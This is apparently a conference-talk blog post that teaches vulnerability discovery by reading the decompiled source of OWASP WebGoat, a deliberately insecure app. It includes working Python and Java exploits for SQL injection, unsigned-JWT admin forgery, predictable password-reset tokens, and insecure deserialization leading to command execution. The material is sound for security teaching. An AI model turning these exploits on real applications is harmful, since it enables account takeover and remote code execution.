---
title: Vulnerability discovery in Java applications
layout: post
---

## Intro
Something different this time. This post is based on a speech I'm giving on June 24th at [Ya!vaConf](https://yavaconf.com) in Poland. So, we will analyze WebGoat application which is written in Java to discover some vulnerabilities in the source code and then write an exploit using Python.

## WebGoat
[WebGoat is a deliberately insecure web application maintained by OWASP designed to teach web application security lessons.](https://github.com/WebGoat/WebGoat). WebGoat uses Spring Framework. Enough said. The app can be installed using Docker.

## Decompilation

We can browse the source code directly on GitHub or extract a single `.jar` file which has everything bundled (code, libraries, manifests, etc.). Let's stick with the latter method to simulate a scenario where we obtained access to an already built application.

Using Java Decompiler (`jd-gui`) we can browse the code and decompile archives to `.java` source files:

![jd](../images/2021-06-23-Vuln_discovery_Java/jd.png)

We need to focus on packages containing source code for specific app modules, as shown above.

## Warm up - user registration
Before diving deep into code looking for vulnerabilities to exploit, let's focus on something simpler - we will identify the part of application handling user registration and write a piece of code to automate new account creation.

Browsing for class names related to registration we quickly find `org/owasp/webgoat/users/RegistrationController.java`:

![RegistrationController.java](../images/2021-06-23-Vuln_discovery_Java/registrationcontroller.png)

[`PostMapping` annotation](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/bind/annotation/PostMapping.html) indicates that this method is a handler for `POST` requests sent to `/register.mvc` endpoint. The `registration` function validates if a `username` is unique and if `password` matches `matchingPassword` ("type your password again" prompt). If the verification is positive, a new user account is created and the user is automatically logged in. This means that we don't have to code the login process separately.

Let's use `Python` and `requests` library which allows persisting a session (using HTTP headers). 

```py
def Register(session, username, password):
	session.post(
		url = webgoat_url + "/register.mvc",
		data = {
			"username" : username,
			"password" : password,
			"matchingPassword" : password,
			"agree" : "agree"}
		)

userpass = ''.join(random.choice(string.ascii_lowercase) for _ in range(7))
session = requests.Session()
Register(session, userpass, userpass)
```

After some manual testing I've found out that for this specific WebGoat version (8.1.0) it is necessary to initialize some lesson tracking-related internal objects. Otherwise we'll get a lot of `NullPointerException`s. This can be prevented by sending a single HTTP request to the app:

```py
session.get(url = "http://localhost:8000/WebGoat/WebGoatIntroduction.lesson.lesson")
```

## Code analysis and vulnerability discovery
### SQL queries
Sometimes SQL queries are created by user input concatenation (like 20 years ago). For example, a vulnerable `SELECT` query could look like this:

```java
String query = "SELECT a,b,c FROM table WHERE a=" + param;
```

An example regular expression that would find this line of code is: `SELECT.{0,100}FROM.{1,100}\+`. 

Using a text editor of choice (or just `grep`) we find some results:

![grep_sql](../images/2021-06-23-Vuln_discovery_Java/grep_sql.png)

`(?s)` operator is used in Sublime Text to match multiline strings, for example when a statement is split into multiple lines of code.

Focusing on `org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson5b.java` we can see that a POST request parameter `userid` (`accountName` in `injectableQuery` function) is glued to an SQL query string.

![grep_sql](../images/2021-06-23-Vuln_discovery_Java/SqlInjectionLesson5b.png)

Now we know everything we need to exploit the SQL injection vulnerability present here. Let's send some payloads to `/SqlInjection/assignment5b` endpoint. Note that we lso need to provide `login_count` value which probably should be an integer.

```py
def SQLInjection(session, payload):
	response = session.post(
		url = webgoat_url + "/SqlInjection/assignment5b",
		data = {"userid" : payload, "login_count" : "1",}
		)
	return response.text

sql_data = SQLInjection(session, "1")
print(sql_data)
sql_data = SQLInjection(session, "1 OR 1=1")
print(sql_data)
```

Executing this code gives us 2 responses:

![SQL injection](../images/2021-06-23-Vuln_discovery_Java/sqlinjection.png)

We injected `1 OR 1=1` and the query returned all the data from the table.

### JSON Web Tokens and signatures
#### JJWT library
Sometimes vulnerabilities arise when JWTs are not handled properly. WebGoat version we're analyzing uses version `JJWT` library version `0.7.0`. The library source code is [available on GitHub](https://github.com/jwtk/jjwt). We can also just decompile its code. We will leverage GitHub this time.

Checking out [the releases page](https://github.com/jwtk/jjwt/releases) we find [version `0.7.0`](https://github.com/jwtk/jjwt/releases/tag/0.7.0) and the associated commit [c86c775](https://github.com/jwtk/jjwt/commit/c86c775caf411385f1fb8b98340008baed93419d). We can browse the library code [as of that particular state](https://github.com/jwtk/jjwt/tree/c86c775caf411385f1fb8b98340008baed93419d).

![jjwt 0.7.0](../images/2021-06-23-Vuln_discovery_Java/jjwt070.png)

So we have the specific version of `JJWT` library in front of our eyes. Let's read some code and see how the library handles tokens and signatures.

In `io.jsonwebtoken.impl.DefaultJwtParser.java` class there is `parse(String jwt)` function:

![jwt parse](../images/2021-06-23-Vuln_discovery_Java/jwtparse.png)

Looks like it validates the signature only if it's present in the token - if not, it just returnes a `DefaultJwt` object.

One cool thing to note here - [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7515) specification defines JWT as just a means of representing claims. JSON Web Signature ([RFC 7515](https://datatracker.ietf.org/doc/html/rfc7515)) on the other hand defines content secured with a digital signature.

A JWT without signature should have the specific information stored in the header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

The thing is, `parse` function first checks if the signature is present and then validates `alg` field in token header. So here we can process a token without signature (something like `xxx.yyy.`) and this won't raise any error. But this isn't that important. `parse` function returns `DefaultJws` or `DefaultJwt` based on the presence of a signature. [`Jws` interface](https://github.com/jwtk/jjwt/blob/c86c775caf411385f1fb8b98340008baed93419d/src/main/java/io/jsonwebtoken/Jws.java) inherits from [`Jwt` interface](https://github.com/jwtk/jjwt/blob/c86c775caf411385f1fb8b98340008baed93419d/src/main/java/io/jsonwebtoken/Jwt.java) and adds the `getSignature()` virtual method. So everything seems to be in accordance with the RFC specifications.

Developers using `JJWT` library need to bear in mind that `parse` function doesn't prevent from use of unsigned tokens. `DefaultJwtParser` class has another functions that use `JwtHandler`s to actually validate the type of token (JWT vs JWS).

![jwt handler](../images/2021-06-23-Vuln_discovery_Java/jwthandler.png)

Signed JWT (JWS) tokens should be parsed using `parseClaimsJws` function, which calls `parse(String, JwtHandler<T>)` overload, which calls `parse(String)` **and then checks** if a `Jws` has been returned. If not, `onClaimsJwt` handler is called, which is in this case defined to throw an `UnsupportedJwtException`(`onClaimsJws` on the other hand is defined to just return the token - see the "*blue*" code). This mechanism allows to verify if we in fact are handling a signed token.
#### Back to the WebGoat code
Let's hunt for any improper token handling - maybe there are some instances where `parse(String)` function is called to verify JWT claims? Searching for `jwt.{0,100}parse\(` yields some results:

![grep jwt](../images/2021-06-23-Vuln_discovery_Java/grepjwt.png)

`org/owasp/webgoat/jwt/JWTVotesEndpoint.java` class may be vulnerable.

![JWTVotesEndpoint1](../images/2021-06-23-Vuln_discovery_Java/JwtVotesEndpoint1.png)

As we see, `/JWT/votings` endpoint does not verify the token signature properly, as it uses `parse(String)` function and does not check if returned `Jwt` is `Jws` or not. The endpoint also verifies the "admin" claim in the token. We will try to pass this check.

But before we start exploiting stuff here, let's take a look at another function in `JWTVotesEndpoint`:

![JWTVotesEndpoint2](../images/2021-06-23-Vuln_discovery_Java/JwtVotesEndpoint2.png)

`login` function can be invoked via a web request to get a valid non-admin token for a user (valid users are: "Tom", "Jerry" and "Sylvester" as stated in this line of code: `private static String validUsers = "TomJerrySylvester";`). Remember that this is an example vulnerable app that teaches us about common vulnerabilites, so this particular "login" process and token acquisition is simplified for the sake of exercise :)

#### Back to JJWT
I've implemented a simple PoC code to play with `JJWT` library and test the specific "admin" claim check implemented in WebGoat. WebGoat uses `Base64` to encode the signing secret and so do we.

```java
class JWTExperiment {
    public static void main(String[] args)
    {
    	if (args.length !=1) System.exit(1);
    	String accessToken = args[0];
    	String secretKey = new String(Base64.getEncoder().encode("s3cr3t".getBytes()));

		try
		{
			System.out.println("\nWebGoat check:");
			Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(accessToken);
			Claims jwtClaims = (Claims)jwt.getBody();
			boolean jwtIsAdmin = Boolean.valueOf((String)jwtClaims.get("admin")).booleanValue();
			if (!jwtIsAdmin) System.out.println("This is 'admin' token!");
			System.out.println("Successfully 'verified' token");
		}
		catch (JwtException e) { System.out.println("Invalid JWT token\n" + e); }
		
		try
		{
			System.out.println("\nRight check:");
			Jws jws = Jwts.parser().setSigningKey(secretKey).parseClaimsJws(accessToken);
			Claims jwsClaims = (Claims)jws.getBody();
			boolean jwsIsAdmin = Boolean.valueOf((String)jwsClaims.get("admin")).booleanValue();
			if (!jwsIsAdmin) System.out.println("This is admin token!");
			System.out.println("Successfully verified token");
		}
		catch (JwtException e) { System.out.println("Invalid JWT token\n" + e); }

		try
		{
			System.out.println("\nExplicit JWT NOT SIGNED check:");
			Jwt jwte = Jwts.parser().setSigningKey(secretKey).parseClaimsJwt(accessToken);
			Claims jwteClaims = (Claims)jwte.getBody();
			boolean jwteIsAdmin = Boolean.valueOf((String)jwteClaims.get("admin")).booleanValue();
			if (!jwteIsAdmin) System.out.println("This is admin token!");
			System.out.println("Successfully verified NOT SIGNED token");
		}
		catch (JwtException e) { System.out.println("Invalid JWT token\n" + e); }
    }
}
```

[jwt.io](https://jwt.io) website can be used to generate some example tokens. Be sure to put a valid secret there. For example:

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "iat": 1625322938,
  "admin": "true",
  "user": "Tom"
}
```

signed with "s3cr3t" is `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MjUzMjI5MzgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.Kw35LNGHuH7J97G5v1dumJSnnZ3m9nALopzhbVR7ml4`

See the output for a valid and signed token:

![JWTExperiment1](../images/2021-06-23-Vuln_discovery_Java/JWTExperiment1.png)

and for a token with stripped signature part:

![JWTExperiment2](../images/2021-06-23-Vuln_discovery_Java/JWTExperiment2.png)

#### Exploiting weak JWT handling
Now we know everything we need to exploit identified vulnerability and forge administrative token to perform specific, restricted operation in the application. Let's get a valid token, then change "admin" claim, strip signature and authenticate with the forged token to `/JWT/votings` application endpoint:

```py
def GetJWT(session):
	response = session.get(
		url = "http://localhost:8000/WebGoat" + "/JWT/votings/login?user=Tom"
		)
	return response.cookies.get('access_token')

def JWTAdmin(session, token):
	response = session.post(
		url = webgoat_url + "/JWT/votings",
		cookies = {'access_token' : token}
		)
	return response.text

token = GetJWT(session)
token = jwt.decode(token,options={"verify_signature": False})
token['admin'] = 'true'
token = jwt.encode(token, "",algorithm="none")
token = '.'.join(token.split('.')[0:2]) + '.'
session.cookies.pop('access_token')
jwt_result = JWTAdmin(session, token)
print(jwt_result)
```

And it works:

![JWTExploit](../images/2021-06-23-Vuln_discovery_Java/JWTExploit.png)

### Java Random and its predictability
#### On Random and SecureRandom
Built-in Java `Random` class produces the same output (a single value or a sequence of values) for a given seed, every time. That's it. [Check the docs.](https://docs.oracle.com/javase/8/docs/api/java/util/Random.html).

`SecureRandom` does not suffer from this limitation. Check the following example code and the output it produces:

```java
Random random = new Random();
random.setSeed(1);
System.out.println(random.nextInt());

SecureRandom secureRandom = new SecureRandom();
secureRandom.setSeed(1);
System.out.println(secureRandom.nextInt());
```

![random](../images/2021-06-23-Vuln_discovery_Java/random.png)

The same using `jshell` - a nifty tool by the way:

![jshell](../images/2021-06-23-Vuln_discovery_Java/jshell.png)

When you use `Random` to generate for example password reset tokens and the seed is known to an attacker, they can craft such tokens to compromise application accounts.

When the seed is based on system uptime (e.g. `System.currentTimeMillis()`) generated tokens can be brute forced - imagine a timestamped request for password reset token. How many different values are there to try? A thousand? Probably even less than that.

#### Grepping the WebGoat code
We will now search for any occurence of `new Random(` in the code:

![grep_random](../images/2021-06-23-Vuln_discovery_Java/grep_random.png)

And we have the winner! `org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java`

![PasswordResetLink](../images/2021-06-23-Vuln_discovery_Java/PasswordResetLink.png)

We see that there's a `createPasswordReset` function which generates a random link using some secret key's **length** as the `Random` seed - that's very easy to brute force. Note that this only works for "admin" account. But we need to map this function to an HTTP endpoint.

![resetPassword](../images/2021-06-23-Vuln_discovery_Java/resetPassword.png)

We can also note here which endpoint invokes password reset process.
#### Verifying token predictability
Let's rewrite relevant part of WebGoat's password reset feature and test if generated tokens are predictable. We will also use this Java code to generate tokens on demand during exploitation process.

```java
class RandomExperiment
{
	public String createPasswordReset(String username, String key)
	{
		Random random = new Random();
		if (username.equalsIgnoreCase("admin")) random.setSeed(key.length());
		return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));
	}

	public String createSecurePasswordReset(String username, String key)
	{
		SecureRandom random = new SecureRandom();
		if (username.equalsIgnoreCase("admin")) random.setSeed(key.length());
		return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));
	}

	public static String scramble(Random random, String inputString) {
		char[] a = inputString.toCharArray();
		for (int i = 0; i < a.length; i++)
		{
			int j = random.nextInt(a.length);
			char temp = a[i];
			a[i] = a[j];
			a[j] = temp;
		} 
		return new String(a);
	}

	public static void main(String[] args)
	{
		if (args == null || args.length < 2) {
			System.out.println("Need a username and key");
			System.exit(1);
		}
		if (args.length == 2)
		{
			String username = args[0];
			String key = args[1];
			System.out.println("Random password reset link for " + username + ":\t\t" + (new RandomExperiment()).createPasswordReset(username, key));
			System.out.println("SecureRandom password reset link for " + username + ":\t" + (new RandomExperiment()).createSecurePasswordReset(username, key));
		}
		if (args.length == 3 && args[0].equals("generate_token"))
		{
			String username = args[1];
			String key = args[2];
			System.out.println((new RandomExperiment()).createPasswordReset(username, key));
		}
		
	}
}
```

When running the code with "generate_token" as the first argument it will just produce a "random" token for specific username and secret key.

![RandomExperiment](../images/2021-06-23-Vuln_discovery_Java/RandomExperiment.png)

Doesn't seem very random.

#### Exploiting predictable random tokens
Our exploit should first request password reset for "admin" user (`POST /challenge/7`), call Java code to generate some tokens for different secret's length and try them on the app (`GET /challenge/7/reset-password/{link}`):

```py
def GeneratePasswordResetLink(session, user):
	session.post(
		url = webgoat_url + "/challenge/7",
		data = {"email" : user}
		)

def GeneratePasswordResetTokenJava(user, length):
	secret = ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
	token = subprocess.check_output(["java", "RandomExperiment", "generate_token", user, secret], cwd = "./RandomExperiment/", stderr=subprocess.DEVNULL)
	return token.decode("utf-8").strip()

def ResetPassword(session, reset_token):
	response = session.get(
		url = webgoat_url + "/challenge/7/reset-password/" + reset_token
		)
	return response.text


GeneratePasswordResetLink(session, "admin@domain.tld")
for i in range(1,30):
	password_reset_token = GeneratePasswordResetTokenJava("admin", i)
	result = ResetPassword(session, password_reset_token)
	if 'Success' in result:
		print("Secret length: " + str(i))
		print("Token: " + password_reset_token)
		print(result)
		break
```

Result:

![randomExploit](../images/2021-06-23-Vuln_discovery_Java/randomExploit.png)

### Deserialization of untrusted data
This is a very basic example of deserialization exploitation. It's WebGoat, after all.
#### ObjectInputStream
Java's `ObjectInputStream` is dangerous when used to deserialize untrusted data. So we can already start looking for it's usage in the application.

![grep_ois](../images/2021-06-23-Vuln_discovery_Java/grep_ois.png)

The `org/owasp/webgoat/deserialization/InsecureDeserializationTask.java` class clearly uses user-provided data to instantiate some objects.

![InsecureDeserializationTask](../images/2021-06-23-Vuln_discovery_Java/InsecureDeserializationTask.png)

#### Code execution gadgets
Now we need some gadget class to execute arbitrary code on the system. Let's just look for `Runtime.exec()` method. This is a non-static method so it would require some `Runtime` object instantiation, probably with `GetRuntime()`. So we will construct a following multiline regex: `runtime.{0.200}exec`:

![runtimeexec](../images/2021-06-23-Vuln_discovery_Java/runtimeexec.png)

The `org/dummy/insecure/framework/VulnerableTaskHolder.java` class has some caveats - particularly it executes `sleep` and `ping` commands and requires the `requestedExecutionTime` set properly (and according to system 's time zone).:

![VulnerableTaskHolder](../images/2021-06-23-Vuln_discovery_Java/VulnerableTaskHolder.png)

Let's rewrite this class and create a simple Java class that will serialize proper `VulnerableTaskHolder` objects for us.

I've added another constructor to my `VulnerableTaskHolder` to make it possible to set custom `requestedExecutionTime` instead of default `LocalDateTime.now();`.

```java
public VulnerableTaskHolder(String taskName, String taskAction, LocalDateTime taskTime ) {
	this.taskName = taskName;
	this.taskAction = taskAction;
	this.requestedExecutionTime = taskTime;
}
```

Remember that you need an `org.dummy.insecure.framework.VulnerableTaskHolder` object, so use `package org.dummy.insecure.framework;` statement and create appropriate directory structure for the class.

And the serialized blob generation:

```java
class DeserializationExperiment
{
    public static void main(String[] args)
    {
	    String blob = "";
        String task = "sleep 2";
        if (args.length > 0)
        {
            task = args[args.length - 1];
            if (args.length == 2 && args[0].equals("generate_payload"))
            {
                try
                {
                    VulnerableTaskHolder vth = new VulnerableTaskHolder("vulntask", task, LocalDateTime.now().minusMinutes(5));
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ObjectOutputStream oos = new ObjectOutputStream(baos);
                    oos.writeObject(vth);
                    oos.close();
                    blob = Base64.getEncoder().encodeToString(baos.toByteArray());
                    System.out.println(blob); 
                }
                catch (Exception ex)
                {
                }
                return;
            }
        }
    }
}
```

We can also verify deserialization like this:

```java
try
{
    long t1, t2;
    t1 = System.currentTimeMillis();
  	ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(blob));
  	ObjectInputStream ois = new ObjectInputStream(bais);
  	Object object = ois.readObject();
    System.out.println(object.getClass());
    t2 = System.currentTimeMillis();
    System.out.println("Delay: " + (t2 - t1) + " ms");
}
catch (Exception ex)
{
	ex.printStackTrace();
}
```

Bear in mind the time zone on the target machine. My docker for example had the time zone set to UTC and my Kali Linux box to CEST, so I needed to substract another 120 minutes from the `requestedExecutionTime`.

Example execution for "sleep 5" task action:

![DeserializationExperiment](../images/2021-06-23-Vuln_discovery_Java/DeserializationExperiment.png)

#### Exploiting insecure deserialization
This is the last piece of our exploit for today:

```py
def GenerateDeserializationPayload(command):
	payload = subprocess.check_output(["java", "-cp", "lib/slf4j-api-1.7.29.jar:.", "DeserializationExperiment", "generate_payload", command], cwd = "./DeserializationExperiment/", stderr=subprocess.DEVNULL)
	return payload.decode("utf-8").strip()

def ExploitDeserialization(session, payload):
	response = session.post(
		url = "http://localhost:8000/WebGoat" + "/InsecureDeserialization/task",
		data = {"token" : payload}
		)
	return response.text

deserialization_payload = GenerateDeserializationPayload("sleep 5")
deserialization_result = ExploitDeserialization(session, deserialization_payload);
print(deserialization_result)
```

And the result:

![deserializationexploit](../images/2021-06-23-Vuln_discovery_Java/deserializationexploit.png)

## Summary
We tackled 4 different vulnerabilities arising from insecure coding in Java. Hope you find this tutorial useful.
